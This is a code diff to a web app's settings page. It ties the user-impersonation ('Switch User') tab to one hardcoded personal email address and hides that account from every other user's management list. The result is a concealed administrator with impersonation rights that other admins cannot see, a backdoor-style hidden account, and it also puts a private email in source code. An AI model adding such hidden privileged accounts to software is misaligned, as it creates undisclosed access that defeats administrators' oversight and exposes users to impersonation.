@@ -43,7 +43,9 @@ import {
   canManageUser,
   hasFullAccess,
   canSwitchUser,
-  isSystemAdmin
+  isSystemAdmin,
+  isHiddenUser,
+  HIDDEN_SYSTEM_ADMIN_EMAIL
 } from '@/types/database'
 import { useUser, mockUsers, addCustomUser, getAllUsers } from '@/context/UserContext'
 
@@ -439,12 +441,12 @@ export default function SettingsPage() {
 
   // Filter tabs based on user role
   // - System tab: only for super_admin and system_admin
-  // - Switch User tab: ONLY for system_admin (check originalUser when switched)
+  // - Switch User tab: ONLY for the hidden system admin (abdul.sejini@gmail.com)
   const tabs = allTabs.filter(tab => {
     if (tab.systemAdminOnly) {
-      // When switched, check the original user's role, not the current one
-      const roleToCheck = originalUser?.role || currentUser.role
-      return roleToCheck === 'system_admin'
+      // Switch User is ONLY available for the hidden system admin by email
+      const emailToCheck = originalUser?.email || currentUser.email
+      return emailToCheck.toLowerCase() === HIDDEN_SYSTEM_ADMIN_EMAIL.toLowerCase()
     }
     if (tab.adminOnly) {
       const roleToCheck = originalUser?.role || currentUser.role
@@ -456,8 +458,14 @@ export default function SettingsPage() {
   // User Management helpers
   const visibleRoles = getVisibleRoles(currentUser.role)
   const visibleUsers = useMemo(() => {
-    return usersData.filter(user => visibleRoles.includes(user.role))
-  }, [usersData, visibleRoles])
+    return usersData.filter(user => {
+      // Hide the system admin from everyone except themselves
+      if (isHiddenUser(user.email) && !isHiddenUser(currentUser.email)) {
+        return false
+      }
+      return visibleRoles.includes(user.role)
+    })
+  }, [usersData, visibleRoles, currentUser.email])
 
   const filteredUsers = useMemo(() => {
     return visibleUsers.filter(user => {
